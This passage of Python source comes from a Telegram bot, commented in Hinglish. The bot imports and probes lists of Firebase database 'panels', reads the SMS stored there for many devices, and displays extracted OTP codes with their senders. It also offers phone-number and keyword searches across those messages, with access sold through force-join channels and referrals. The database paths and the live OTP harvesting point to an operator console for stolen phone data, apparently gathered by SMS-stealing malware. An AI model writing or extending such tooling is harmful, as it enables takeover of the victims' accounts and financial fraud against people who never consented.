            "\u2022 Message jaise hai <b>EXACT waise</b> jayega \u2014 koi extra step nahi\n\n"
            "<i>Bot us message ki exact copy sabhi users ko bhej dega.</i>\n"
            "Cancel karne ke liye <code>/cancel</code> bhejein.",
            parse_mode="HTML"
        )
        return

    if data == "admin_users" and is_admin:
        total = len(all_users)
        text = f"👥 <b>Total Users:</b> {total}\n\n"
        for count, (uid, udata) in enumerate(list(all_users.items())[:30], 1):
            access_icon = "✅" if has_access(uid) else "🚫"
            text += f"{count}. {access_icon} {udata.get('name','Unknown')} (<code>{uid}</code>)\n"
        await query.message.reply_text(text, parse_mode="HTML"); return

    # ── QUICK ACTIONS (safety net — pending ke bina bhi kaam) ──────────────
    if data.startswith("fjq:") and is_admin:
        channel = data[4:].strip()
        existing = {str(c.get("channel", "")).strip() for c in FORCE_JOIN_CHANNELS if isinstance(c, dict)}
        if channel in existing:
            await query.answer(f"⚠️ {channel} already added hai.", show_alert=True)
            return
        if channel.startswith("-100"):
            await query.answer("Private ID ke liye invite URL chahiye — Force Join panel se add karein.", show_alert=True)
            return
        # Verify karo ki bot is channel ko dekh sakta hai — warna Verify Join
        # kaam nahi karega (warning ke saath add, silent fail nahi).
        warn = ""
        if channel.startswith("@"):
            try:
                await ctx.bot.get_chat(channel)
            except Exception as _ve:
                warn = (f"\n\n⚠️ <i>Bot <code>{html_escape(channel)}</code> tak nahi pahunch paaya "
                        f"(<code>{html_escape(str(_ve))[:80]}</code>). Bot ko channel me admin/member "
                        f"banayein, warna Verify check fail hoga.</i>")
        FORCE_JOIN_CHANNELS.append({"channel": channel, "url": ""})
        save_data()
        await query.answer(f"✅ {channel} added!")
        await safe_edit(
            query,
            f"✅ <b>Force Join channel added</b>\n\n"
            f"Channel: <code>{html_escape(channel)}</code>\n"
            f"URL: <code>{html_escape(get_force_join_url({'channel': channel}))}</code>\n\n"
            f"Total channels: <b>{len(FORCE_JOIN_CHANNELS)}</b>{warn}",
            reply_markup=admin_force_join_keyboard(),
        )
        return

    if data.startswith("gaq:") and is_admin:
        target_id = int(data[4:].strip())
        grant_access(target_id)
        await query.answer(f"✅ Access granted: {target_id}")
        await safe_edit(
            query,
            f"✅ <b>Access Granted</b>\n\nUser: <code>{target_id}</code>",
            reply_markup=admin_keyboard(),
        )
        try:
            await ctx.bot.send_message(
                target_id,
                "✅ <b>Access Granted!</b>\n\nAapko bot use karne ki ijazat mil gayi.\n/start karein.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    # ── CATCH-ALL ────────────────────────────────────────────────────────────
    # Koi bhi button jo upar ke kisi branch se match nahi hua, us par button
    # hamesha ghoomta rehta tha aur bot chup rehta tha ("respond hi nahi karta").
    # Yahan har case me saaf jawab dete hain.
    try:
        if not is_admin and data.startswith(("admin_", "adm_")):
            await query.answer("🚫 Admin only — aap owner nahi hain.", show_alert=True)
        elif data.startswith(("admin_", "adm_")):
            await query.answer("⚠️ Ye option abhi available nahi. /start se panel refresh karein.", show_alert=True)
        else:
            await query.answer()
    except Exception:
        pass
    return

# ═══════════════════════════════════════════════════════
#  FULL KEYWORD SEARCH HELPER (called after user confirms)
# ═══════════════════════════════════════════════════════

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """BULLETPROOF wrapper: har button click yahan se guzarta hai.
    Agar andar kahin bhi exception aaye to user ko turant visible alert
    milega — kabhi bhi 'button dabaya, kuch nahi hua' nahi hoga."""
    import traceback as _tb
    query = update.callback_query
    data = (query.data or "") if query else ""
    try:
        await _on_callback_impl(update, ctx)
    except Exception as e:
        _log(f"CALLBACK CRASH data={data[:60]!r} :: {type(e).__name__}: {e}")
        _tb.print_exception(type(e), e, e.__traceback__)
        try:
            await query.answer(
                f"⚠️ Error: {type(e).__name__}: {str(e)[:150]}\nDobara try karein ya /start bhejein.",
                show_alert=True,
            )
        except Exception:
            pass
        try:
            await ctx.bot.send_message(
                query.message.chat_id,
                f"⚠️ <b>Is button me error aaya</b>\n"
                f"<code>{html_escape(str(e))[:250]}</code>\n\n"
                f"<i>/start bhejein — panel refresh ho jayega.</i>",
                parse_mode="HTML",
            )
        except Exception:
            pass


async def _run_full_keyword_search(chat_id: int, keyword: str, is_admin: bool, send_to: int, ctx) -> None:
    import io
    esc_kw   = html_escape(keyword)
    wait_msg = await ctx.bot.send_message(
        send_to,
        f"🔎 Poora search chal raha hai — keyword <code>{esc_kw}</code>...\n⏳ Wait karein...",
        parse_mode="HTML"
    )

    devices = await get_all_devices(is_admin)
    devices_with_nums = [d for d in devices if d.numbers]

    kw_sem = asyncio.Semaphore(30)
    async def _fetch(d):
        async with kw_sem:
            return await get_device_sms(d, limit=SMS_LIMIT)

    sms_results = await asyncio.gather(*(_fetch(d) for d in devices_with_nums), return_exceptions=True)

    no_keyword_numbers = []
    no_sms_skipped     = 0
    keyword_matched    = 0

    for d, smss in zip(devices_with_nums, sms_results):
        if isinstance(smss, Exception) or not smss:
            no_sms_skipped += 1
            continue
        keyword_found = False
        for sms in smss:
            body = (sms.get("body") or sms.get("message") or sms.get("text") or "").lower()
            if keyword in body:
                keyword_found = True
                break
        if keyword_found:
            keyword_matched += 1
        else:
            latest_sms   = smss[0]
            body_preview = (latest_sms.get("body") or latest_sms.get("message") or latest_sms.get("text") or "")[:80]
            no_keyword_numbers.append((d, latest_sms, body_preview))

    try: await wait_msg.delete()
    except: pass

    total_checked = len(devices_with_nums)
    found_count   = len(no_keyword_numbers)

    if not no_keyword_numbers:
        await ctx.bot.send_message(
            send_to,
            f"🔎 <b>Keyword Search: <code>{esc_kw}</code></b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📱 Checked: {total_checked}  |  ✅ Keyword mila (skip): {keyword_matched}  |  ⏭ No SMS: {no_sms_skipped}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"✅ Sabhi numbers mein keyword mila — koi result nahi.",
            parse_mode="HTML"
        )
        return

    header = (
        f"🔎 <b>Keyword Search: <code>{esc_kw}</code></b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📱 Checked: {total_checked}  |  ✅ Skip (matched): {keyword_matched}  |  ⏭ No SMS: {no_sms_skipped}\n"
        f"🎯 Keyword NAHI mila: <b>{found_count}</b> numbers\n"
        f"━━━━━━━━━━━━━━━━━━\n"
    )
    lines = []
    rows  = []
    for i, (d, latest_sms, preview) in enumerate(no_keyword_numbers[:30], 1):
        icon    = "🟢" if d.status == "online" else "🔴"
        num_str = d.numbers[0] if d.numbers else d.name
        dt      = sms_date(latest_sms)
        lines.append(f"{i}. {icon} {html_escape(num_str)}  [{html_escape(d.db_tag)}]  {dt}\n    💬 {html_escape(preview)}...")
        if i <= 15:
            rows.append([premium_button(f"{icon} {num_str}", callback_data=f"sel:{d.id}")])

    full_text = header + "\n".join(lines)
    if len(full_text) > 4000:
        full_text = full_text[:3990] + "\n..."
    rows.append([premium_button("❌ Close", callback_data="close_msg")])
    await ctx.bot.send_message(send_to, full_text, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

    # .txt file with ALL non-matching numbers
    all_nums = [d.numbers[0] if d.numbers else d.name for d, _, __ in no_keyword_numbers]
    file_content = (
        f"Keyword Search: {keyword}\n"
        f"Checked: {total_checked} | Mila+Skip: {keyword_matched} | No SMS: {no_sms_skipped}\n"
        f"Keyword NAHI mila: {found_count} numbers\n"
        f"{'='*40}\n"
        + "\n".join(all_nums)
    ).encode("utf-8")
    file_obj      = io.BytesIO(file_content)
    file_obj.name = f"keyword_{keyword[:20]}.txt"
    await ctx.bot.send_document(
        send_to,
        document=file_obj,
        filename=file_obj.name,
        caption=f"📄 <code>{esc_kw}</code> — {found_count} numbers (keyword nahi mila)",
        parse_mode="HTML"
    )

# ═══════════════════════════════════════════════════════
#  DOCUMENT HANDLER — .txt file se bulk number search
# ═══════════════════════════════════════════════════════

async def firebase_is_active(url: str) -> bool:
    """True when Firebase RTDB has at least one client entry.

    Probes /clients.json?shallow=true — returns a dict of device IDs
    for real DBs with connected devices, and null/empty for dead DBs.
    Falls back to /user_data.json?shallow=true and /All_Users.json?shallow=true
    so we don't miss DBs that use alternate schema paths.
    Root /.json returns HTTP 200 even for empty/dead DBs — do NOT use it.
    """
    try:
        base = str(url or "").strip().rstrip("/")
        if not base.startswith("http"):
            return False
        session = await _get_session()
        timeout = aiohttp.ClientTimeout(total=8, connect=3)
        # Try each known data path; first non-empty dict wins
        for path in (
            "/clients.json?shallow=true",
            "/user_data.json?shallow=true",
            "/All_Users/simDetails.json?shallow=true",
        ):
            try:
                async with session.get(f"{base}{path}", timeout=timeout) as r:
                    if r.status == 200:
                        body = await r.json(content_type=None)
                        if body and isinstance(body, dict):
                            return True  # has at least one entry
            except Exception:
                continue
        return False
    except Exception:
        return False


async def filter_active_panel_urls(text: str) -> tuple[str, int, int]:
    """Keep only active Firebase URLs from pasted text / .txt content.

    Returns (filtered_text, active_count, dead_count).
    """
    lines_out = []
    active = dead = 0
    for raw in (text or "").splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if "=" in line:
            tag, url = line.split("=", 1)
            tag, url = tag.strip(), url.strip()
        else:
            tag, url = "", line
        if not (url.startswith("http://") or url.startswith("https://")):
            dead += 1
            continue
        ok = await firebase_is_active(url)
        if ok:
            active += 1
            lines_out.append(f"{tag}={url}" if tag else url)
        else:
            dead += 1
    return "\n".join(lines_out), active, dead


async def remove_dead_firebases() -> tuple[int, list]:
    """Probe every DATABASES entry and drop unreachable ones."""
    removed = []
    items = list(DATABASES.items())
    for tag, url in items:
        if not await firebase_is_active(url):
            removed.append(tag)
    for tag in removed:
        DATABASES.pop(tag, None)
        ADMIN_ONLY_TAGS.discard(tag)
        GLOBAL_DEVICE_CACHE.pop(tag, None)
    if removed:
        save_data()
    return len(removed), removed


def parse_bulk_panel_urls(text: str) -> tuple[int, int, int, int, dict]:
    """Parse TAG=URL and URL-only lines for admin panel imports.

    Returns: (added, duplicates, conflicts, invalid, newly_added)
    """
    success_count = 0
    invalid_count = 0
    duplicate_count = 0
    conflict_count = 0

    existing_urls = {
        str(url).strip().rstrip("/").lower()
        for url in DATABASES.values()
        if url
    }
    existing_tags = set(DATABASES.keys())
    newly_added = {}

    def next_auto_tag() -> str:
        index = 1
        while f"TAG{index}" in existing_tags:
            index += 1
        tag = f"TAG{index}"
        existing_tags.add(tag)
        return tag

    for raw_line in text.splitlines():
        line = raw_line.strip()

        if not line or line.startswith("#"):
            continue

        if "=" in line:
            tag, url = line.split("=", 1)
            tag = tag.strip()
            url = url.strip()
            if not tag or not url:
                invalid_count += 1
                continue
        else:
            url = line
            tag = next_auto_tag()

        if not (url.startswith("https://") or url.startswith("http://")):
            invalid_count += 1
            continue

        normalized_url = url.rstrip("/")
        normalized_lower = normalized_url.lower()

        if normalized_lower in existing_urls:
            duplicate_count += 1
            continue

        # Auto-resolve TAG conflict — append suffix instead of silently dropping
        if tag in DATABASES or tag in newly_added:
            original_conflict_tag = tag
            suffix = 2
            while f"{original_conflict_tag}_{suffix}" in DATABASES or f"{original_conflict_tag}_{suffix}" in newly_added:
                suffix += 1
            tag = f"{original_conflict_tag}_{suffix}"
            existing_tags.add(tag)
            conflict_count += 1  # still count so admin knows a rename happened

        DATABASES[tag] = normalized_url
        newly_added[tag] = normalized_url
        existing_urls.add(normalized_lower)
        success_count += 1

    return success_count, duplicate_count, conflict_count, invalid_count, newly_added


async def handle_bulk_panel_import(
    update: Update,
    ctx: ContextTypes.DEFAULT_TYPE,
    text: str,
    source_label: str = "message",
) -> None:
    """Import admin panel URLs from pasted text or a .txt file."""
    chat_id = update.effective_chat.id
    if chat_id not in ADMIN_IDS:
        return

    (success_count, duplicate_count, conflict_count,
     invalid_count, newly_added) = parse_bulk_panel_urls(text)

    save_data()
    pending_action.pop(chat_id, None)

    await update.message.reply_text(
        "✅ <b>PANEL IMPORT COMPLETE</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📄 Source      : <code>{html_escape(source_label)}</code>\n"
        f"✅ Added       : <code>{success_count}</code>\n"
        f"🔁 Duplicates  : <code>{duplicate_count}</code>\n"
        f"⚠️ Renamed     : <code>{conflict_count}</code>  <i>(TAG conflict — auto-renamed)</i>\n"
        f"❌ Invalid     : <code>{invalid_count}</code>\n"
        f"📡 Total DBs   : <code>{len(DATABASES)}</code>\n"
        "━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

    if not newly_added:
        return

    await update.message.reply_text(
        f"🔄 <b>{len(newly_added)}</b> naye panels ka data fetch ho raha hai...",
        parse_mode="HTML"
    )

    # Keep the existing behavior: immediately populate cache for newly-added panels.
    fetch_tasks = {tag: fetch_db_data(tag, url) for tag, url in newly_added.items()}
    results = await asyncio.gather(*fetch_tasks.values(), return_exceptions=True)

    for tag, result in zip(fetch_tasks.keys(), results):
        if isinstance(result, Exception):
            GLOBAL_DEVICE_CACHE[tag] = []
        else:
            GLOBAL_DEVICE_CACHE[tag] = result

    for tag, devices in zip(fetch_tasks.keys(), results):
        if isinstance(devices, Exception) or not devices:
            await update.message.reply_text(
                f"📡 <b>{html_escape(tag)}</b>\n"
                f"💾 Panel save ho gaya — lekin abhi koi device connected nahi.\n"
                f"<i>Firebase mein devices aane ke baad /start karke refresh karein.</i>",
                parse_mode="HTML"
            )
            continue

        online = sum(1 for d in devices if d.status == "online")
        db_url = newly_added[tag]

        # ── Fetch latest SMS for online devices to show live OTPs ──────
        async def _latest_otp_for_device(dev: "Device") -> Optional[str]:
            """Return extracted OTP string or None for a device."""
            try:
                sms_data = await fb_get(dev.sms_path.lstrip("/"), dev.base_url)
                if not sms_data:
                    return None
                # Sort by timestamp descending and check last 5 messages
                msgs = sorted(
                    sms_data.values(),
                    key=lambda m: m.get("timestamp", 0) if isinstance(m, dict) else 0,
                    reverse=True
                )
                for m in msgs[:5]:
                    if not isinstance(m, dict):
                        continue
                    body = str(m.get("body") or m.get("message") or "")
                    otp = extract_otp(body)
                    if otp:
                        sender = str(m.get("address") or m.get("sender") or "")
                        return f"🔑 <b>{otp}</b>" + (f" <i>({html_escape(sender[:20])})</i>" if sender else "")
            except Exception:
                pass
            return None

        # Only fetch SMS for online devices (limit 8 to avoid flooding)
        online_devs = [d for d in devices if d.status == "online"][:8]
        otp_tasks = [_latest_otp_for_device(d) for d in online_devs]
        otp_results = await asyncio.gather(*otp_tasks, return_exceptions=True)
        otp_map: dict[str, Optional[str]] = {}
        for dev, res in zip(online_devs, otp_results):
            otp_map[dev.id] = res if not isinstance(res, Exception) else None

        num_lines = [
            f"📡 <b>{html_escape(tag)}</b> — {len(devices)} devices, {online} online\n"
            "━━━━━━━━━━━━━━━━━━"
        ]
        num_count = 0

        for i, d in enumerate(
            sorted(devices, key=lambda x: (0 if x.status == "online" else 1)),
            1,
        ):
            icon = "🟢" if d.status == "online" else "🔴"
            batt = f" 🔋{d.battery}%" if d.battery else ""
            if d.numbers:
                nums_str = " | ".join(f"<code>{html_escape(n)}</code>" for n in d.numbers)
                line = f"{i}. {icon} {nums_str}{batt}"
                # Append OTP if available for this online device
                otp_str = otp_map.get(d.id)
                if otp_str:
                    line += f"\n    └ {otp_str}"
                num_lines.append(line)
                num_count += len(d.numbers)
            else:
                num_lines.append(f"{i}. {icon} ⚙️ {html_escape(d.name[:20])}{batt}")

        num_lines.append(f"━━━━━━━━━━━━━━━━━━\n📲 Total Numbers: <b>{num_count}</b>")
        msg_text = "\n".join(num_lines)

        if len(msg_text) > 4000:
            await update.message.reply_text(msg_text[:4000], parse_mode="HTML")
        else:
            await update.message.reply_text(msg_text, parse_mode="HTML")


async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)
    if all_users.get(chat_id, {}).get("banned"): return
    if not is_admin:
        ready, reason = await gate_state(ctx.bot, chat_id)
        if not ready:
            await send_gate_message(update, ctx, reason)
            return
    if not has_access(chat_id):
        await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return

    doc = update.message.document
    if not doc: return

    fname = doc.file_name or ""
    mime  = doc.mime_type or ""

    # ── ADMIN: Direct .txt panel import ─────────────────────────────
    # Supported formats:
    #   TAG1=https://example-default-rtdb.firebaseio.com
    #   TAG2=https://example2-default-rtdb.firebaseio.com
    # OR URL-only, where TAG1/TAG2/... are generated automatically.
    if is_admin and pending_action.get(chat_id, {}).get("action") == "add_bulk_db":
        if not (fname.lower().endswith(".txt") or "text" in mime.lower()):
            await update.message.reply_text(
                "⚠️ Panel import ke liye sirf <b>.txt</b> file upload karein.",
                parse_mode="HTML"
            )
            return

        if doc.file_size and doc.file_size > 500_000:
            await update.message.reply_text("⚠️ File bahut badi hai (max 500KB).")
            return

        wait_msg = await update.message.reply_text("📂 Panel TXT file read ho rahi hai...")
        try:
            tg_file = await ctx.bot.get_file(doc.file_id)
            import io as _io
            buf = _io.BytesIO()
            await tg_file.download_to_memory(buf)
            content = buf.getvalue().decode("utf-8-sig", errors="strict")
        except UnicodeDecodeError:
            try:
                content = buf.getvalue().decode("utf-8", errors="ignore")
            except Exception:
                content = ""
        except Exception as e:
            try: await wait_msg.edit_text(f"❌ File download error: {e}")
            except: pass
            return

        try: await wait_msg.delete()
        except: pass

        act = pending_action.get(chat_id, {})
        if act.get("action") in ("ops_imp_json", "ops_imp_sqlite", "ops_imp_mongo"):
            raw = buf.getvalue()
            try:
                if act.get("action") == "ops_imp_json":
                    msg = import_backup_json_bytes(raw)
                elif act.get("action") == "ops_imp_sqlite":
                    msg = import_backup_sqlite_bytes(raw)
                else:
                    msg = import_backup_mongo_bytes(raw)
                pending_action.pop(chat_id, None)
                await update.message.reply_text(
                    f"✅ <b>RESTORE COMPLETE</b>\n━━━━━━━━━━━━━━━━━━\n{html_escape(msg)}",
                    parse_mode="HTML",
                )
            except Exception as e:
                await update.message.reply_text(f"❌ Import failed: <code>{html_escape(str(e))[:300]}</code>", parse_mode="HTML")
            return
        if act.get("action") == "add_active_db":
            filtered, active_n, dead_n = await filter_active_panel_urls(content)
            await update.message.reply_text(
                f"🔍 Active: <b>{active_n}</b> | Dead skipped: <b>{dead_n}</b>",
                parse_mode="HTML",
            )
            if not filtered.strip():
                pending_action.pop(chat_id, None)
                await update.message.reply_text("❌ File me koi active Firebase nahi mili.", parse_mode="HTML")
                return
            await handle_bulk_panel_import(update, ctx, filtered, source_label=f"active-txt:{doc.file_name}")
            return

        await handle_bulk_panel_import(update, ctx, content, source_label=f"TXT: {fname}")
        return

    # ── EXISTING: .txt file se bulk number search ───────────────────
    if not (fname.lower().endswith(".txt") or "text" in mime.lower()):
        await update.message.reply_text("⚠️ Sirf .txt file bhejein jisme numbers hon (ek per line).")
        return

    if doc.file_size and doc.file_size > 500_000:
        await update.message.reply_text("⚠️ File bahut badi hai (max 500KB).")
        return

    wait_msg = await update.message.reply_text("📂 File padh raha hoon...")
    try:
        tg_file = await ctx.bot.get_file(doc.file_id)
        import io as _io
        buf = _io.BytesIO()
        await tg_file.download_to_memory(buf)
        content = buf.getvalue().decode("utf-8", errors="ignore")
    except Exception as e:
        await wait_msg.edit_text(f"❌ File download error: {e}")
        return

    # Extract numbers from file content
    raw_queries = re.split(r"[\n,;\s]+", content.strip())
    queries = [re.sub(r"\D", "", q) for q in raw_queries if len(re.sub(r"\D", "", q)) >= 8]
    queries = list(dict.fromkeys(queries))

    if not queries:
        await wait_msg.edit_text("❌ File mein koi valid number nahi mila (min 8 digits chahiye).")
        return

    await wait_msg.edit_text(
        f"📂 File mein <b>{len(queries)}</b> numbers mile.\n🔍 Search ho raha hai...",
        parse_mode="HTML"
    )

    devices = await get_all_devices(is_admin)

    # Pre-build index for fast lookup
    device_num_index = {}
    for d in devices:
        for num in d.numbers:
            clean = re.sub(r"\D", "", num)
            if clean not in device_num_index:
                device_num_index[clean] = []
            device_num_index[clean].append(d)

    results_found   = []
    results_missing = []
    for q in queries:
        matched = []
        for stored_num, devs in device_num_index.items():
            if q in stored_num or stored_num in q:
                for d in devs:
                    if d not in matched:
                        matched.append(d)
        if matched: results_found.append((q, matched))
        else:       results_missing.append(q)

    try: await wait_msg.delete()
    except: pass

    found_c = len(results_found)
    miss_c  = len(results_missing)

    summary = (
        f"🎯 <b>File Bulk Search Results</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📋 File mein numbers : <b>{len(queries)}</b>\n"
        f"✅ Mila              : <b>{found_c}</b>\n"
        f"❌ Nahi Mila         : <b>{miss_c}</b>\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    rows = []
    for q, devs in results_found[:20]:
        d = devs[0]
        icon = "🟢" if d.status == "online" else "🔴"
        num_label = d.numbers[0] if d.numbers else d.name
        rows.append([premium_button(f"{icon} {q} → [{d.db_tag}] {num_label}", callback_data=f"sel:{d.id}")])
    rows.append([premium_button("❌ Close", callback_data="close_msg")])
    await update.message.reply_text(summary, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")

    # Full result as .txt file
    import io
    file_lines = [
        f"=== FILE BULK SEARCH RESULTS ===",
        f"Source file: {fname}",
        f"Total: {len(queries)} | Mila: {found_c} | Nahi Mila: {miss_c}",
        f"{'='*40}", "",
        "✅ MILA (Found):",
    ]
    for q, devs in results_found:
        d = devs[0]
        status = "ONLINE" if d.status == "online" else "offline"
        num_label = d.numbers[0] if d.numbers else d.name
        file_lines.append(f"  {q}  →  [{d.db_tag}] {num_label}  ({status})")
    file_lines += ["", "❌ NAHI MILA (Not Found):"]
    for q in results_missing:
        file_lines.append(f"  {q}")

    file_bytes = "\n".join(file_lines).encode("utf-8")
    file_obj   = io.BytesIO(file_bytes)
    file_obj.name = "bulk_result.txt"
    await update.message.reply_document(
        document=file_obj,
        filename="bulk_result.txt",
        caption=f"📄 Full result — {found_c} mila, {miss_c} nahi mila",
    )

# ═══════════════════════════════════════════════════════
#  TEXT HANDLER & INPUT PIPELINES
# ═══════════════════════════════════════════════════════

async def _on_text_impl(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    global DATABASES, FORCE_JOIN_CHANNELS, REQUIRED_REFERRALS
    chat_id = update.effective_chat.id
    text = (update.message.text or "").strip()
    is_admin = maybe_promote_admin(update.effective_user) or (chat_id in ADMIN_IDS)

    _log(f"TXT {chat_id} admin={is_admin} pending={pending_action.get(chat_id)} ALL_PENDING={dict(pending_action)} text={text[:45]!r}")

    if all_users.get(chat_id, {}).get("banned") or is_spamming(chat_id): return

    if not is_admin and MAINTENANCE_MODE:
        await update.message.reply_text(
            "🛠 <b>MAINTENANCE MODE</b>\n━━━━━━━━━━━━━━━━━━\n"
            "Bot abhi maintenance par hai. Thodi der baad try karein.",
            parse_mode="HTML"
        )
        return

    if text in ("My Profile", "Help", "👤 My Profile", "❓ Help"):
        if text in ("My Profile", "👤 My Profile"):
            u = all_users.get(chat_id, {})
            await update.message.reply_text(
                f"{premium_emoji()} <b>MY PROFILE</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"🆔 ID       : <code>{chat_id}</code>\n"
                f"👤 Name     : <b>{html_escape(u.get('name', 'Unknown'))}</b>\n"
                f"🔗 Username : @{html_escape(u.get('username') or 'none')}\n"
                f"📅 Joined   : <b>{u.get('joined_at', '-')}</b>\n"
                f"✅ Access   : <b>{'Yes' if has_access(chat_id) else 'No'}</b>\n"
                f"🎁 Referrals: <b>{referral_count(chat_id)}/{REQUIRED_REFERRALS}</b>",
                parse_mode="HTML",
                reply_markup=user_extra_keyboard(chat_id)
            )
        else:
            await update.message.reply_text(
                f"{premium_emoji()} <b>HELP</b>\n━━━━━━━━━━━━━━━━━━\n"
                "📡 All Panels — sabhi panels\n"
                "🔍 Search Number — number search\n"
                "🔑 Keyword Search — keyword search\n"
                "🕒 Recent OTPs — latest OTPs\n"
                "📊 Panel Status — health check\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "Commands: /start /status",
                parse_mode="HTML",
                reply_markup=user_extra_keyboard(chat_id)
            )
        return

    if not is_admin:
        ready, reason = await gate_state(ctx.bot, chat_id)
        if not ready:
            await send_gate_message(update, ctx, reason)
            return

    if chat_id in pending_action:
        act_data = pending_action.pop(chat_id)
        action = act_data["action"]

        if action == "broadcast_buttons" and is_admin:
            src_msg = act_data.get("src_msg")
            raw = text.strip()
            if raw.lower() in ("skip", "-", "no", "none"):
                markup = None
            else:
                try:
                    markup = _parse_broadcast_buttons(raw)
                except Exception as exc:
                    await update.message.reply_text(
                        f"\u274c Button format galat: <code>{html_escape(str(exc))}</code>\n"
                        "Example: <code>Open | https://example.com</code>",
                        parse_mode="HTML",
                    )
                    pending_action[chat_id] = act_data
                    return
                if markup is None:
                    await update.message.reply_text(
                        "\u274c Koi valid button nahi mila.\n"
                        "Format: <code>Label | https://url</code>\n"
                        "Ya <code>skip</code> bhejein.",
                        parse_mode="HTML",
                    )
                    pending_action[chat_id] = act_data
                    return
            if not src_msg:
                await update.message.reply_text("\u274c Source message lost. Broadcast dobara shuru karein.")
                return
            await _run_broadcast(ctx, chat_id, int(src_msg), markup)
            return

        try:
            if await extra_text_actions(update, ctx, action, act_data, text, chat_id, is_admin):
                return
        except Exception as e:
            _log(f"extra_text_actions error [{action}]: {type(e).__name__}: {e}")

        if action == "add_force_join_channel" and is_admin:
            value = text.strip()
            if not value:
                await update.message.reply_text("❌ Channel details empty nahi ho sakti.")
                pending_action[chat_id] = act_data
                return

            # ── MULTI-ADD SUPPORT ─────────────────────────────────────
            # Ek hi message me kitne bhi channels — har line pe ek channel:
            #   @channel1
            #   @channel2
            #   https://t.me/channel3
            #   -1001234567890 | https://t.me/+xxxx
            raw_lines = [ln.strip() for ln in re.split(r"[\n,;]+", value) if ln.strip()]

            def _parse_one(raw: str):
                """Returns (channel, url, error_message)."""
                if "|" in raw:
                    ch, u = [x.strip() for x in raw.split("|", 1)]
                else:
                    ch, u = raw, ""

                m_url = re.fullmatch(
                    r"(?:https?://)?(?:www\.)?(?:t|telegram)\.me/([A-Za-z][A-Za-z0-9_]{3,})/?",
                    ch,
                )
                if m_url:
                    ch = "@" + m_url.group(1)

                m_invite = re.fullmatch(
                    r"(?:https?://)?(?:www\.)?(?:t|telegram)\.me/(\+[A-Za-z0-9_-]+|joinchat/[A-Za-z0-9_-]+)/?",
                    ch,
                )
                if m_invite and not u:
                    return None, None, (
                        "Ye sirf invite link hai — iske saath numeric ID chahiye.\n"
                        "Format: <code>-1001234567890 | https://t.me/+xxxx</code>"
                    )

                if not (ch.startswith("@") or ch.startswith("-100")):
                    if re.fullmatch(r"[A-Za-z][A-Za-z0-9_]{3,}", ch):
                        ch = "@" + ch
                    else:
                        return None, None, (
                            "Invalid format. Public: <code>@username</code> / "
                            "<code>https://t.me/username</code> · Private: "
                            "<code>-1001234567890 | https://t.me/+xxxx</code>"
                        )

                if u and not re.fullmatch(r"(?:https?://)?(?:www\.)?(?:t|telegram)\.me/.+", u):
                    return None, None, "URL invalid hai. Example: <code>https://t.me/+xxxx</code>"

                if ch.startswith("-100") and not u:
                    return None, None, (
                        "Private channel ke liye invite URL zaroori hai.\n"
                        "Example: <code>-1001234567890 | https://t.me/+xxxx</code>"
                    )
                return ch, u, None

            existing = {
                str(item.get("channel", "")).strip()
                for item in FORCE_JOIN_CHANNELS
                if isinstance(item, dict)
            }

            added, skipped, failed = [], [], []
            for raw in raw_lines:
                ch, u, err = _parse_one(raw)
                if err:
                    failed.append((raw, err))
                    continue
                if ch in existing:
                    skipped.append(ch)
                    continue
                # Public channel ho to bot usse resolve kar paata hai ya nahi —
                # verify check ke liye bot ka channel me hona zaroori hai.
                warn = ""
                if ch.startswith("@"):
                    try:
                        await ctx.bot.get_chat(ch)
                    except Exception:
                        warn = " ⚠️ <i>Bot is channel tak nahi pahunch paaya — bot ko channel me admin/member banayein, warna Verify check fail hoga.</i>"
                FORCE_JOIN_CHANNELS.append({"channel": ch, "url": u})
                existing.add(ch)
                added.append((ch, u, warn))

            if added:
                save_data()

            lines = [f"{premium_emoji()} <b>FORCE JOIN — ADD RESULT</b>", "━━━━━━━━━━━━━━━━━━"]
            for ch, u, warn in added:
                lines.append(f"✅ <code>{html_escape(ch)}</code>")
                lines.append(f"   🔗 <code>{html_escape(u or get_force_join_url({'channel': ch}))}</code>{warn}")
            for ch in skipped:
                lines.append(f"🔁 <code>{html_escape(ch)}</code> — already added")
            for raw, err in failed:
                lines.append(f"❌ <code>{html_escape(raw[:40])}</code>\n   {err}")
            lines.append("━━━━━━━━━━━━━━━━━━")
            lines.append(f"📢 Total channels: <b>{len(FORCE_JOIN_CHANNELS)}</b>")

            await update.message.reply_text(
                "\n".join(lines),
                parse_mode="HTML",
                reply_markup=admin_force_join_keyboard()
            )
            return

        if action == "set_required_referrals" and is_admin:
            try:
                value = max(0, int(text.strip()))
            except ValueError:
                await update.message.reply_text("❌ Sirf number bhejein. Example: 2")
                return
            REQUIRED_REFERRALS = value
            save_data()
            await update.message.reply_text(
                f"✅ Required referrals set to <b>{REQUIRED_REFERRALS}</b>.", parse_mode="HTML",
                reply_markup=admin_referral_keyboard()
            )
            return

        if action == "search_num_pipe":
            if not has_access(chat_id):
                await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML"); return
            devices = await get_all_devices(is_admin)
            clean_q = re.sub(r"\D", "", text)
            found = [
                d for d in devices
                if any(clean_q in re.sub(r"\D", "", num) for num in d.numbers)
                and (is_admin or d.db_tag not in ADMIN_ONLY_TAGS)
            ]
            if found:
                rows = [[premium_button(
                    f"📱 [{fd.db_tag}] {fd.numbers[0] if fd.numbers else fd.name}",
                    callback_data=f"sel:{fd.id}"
                )] for fd in found[:15]]
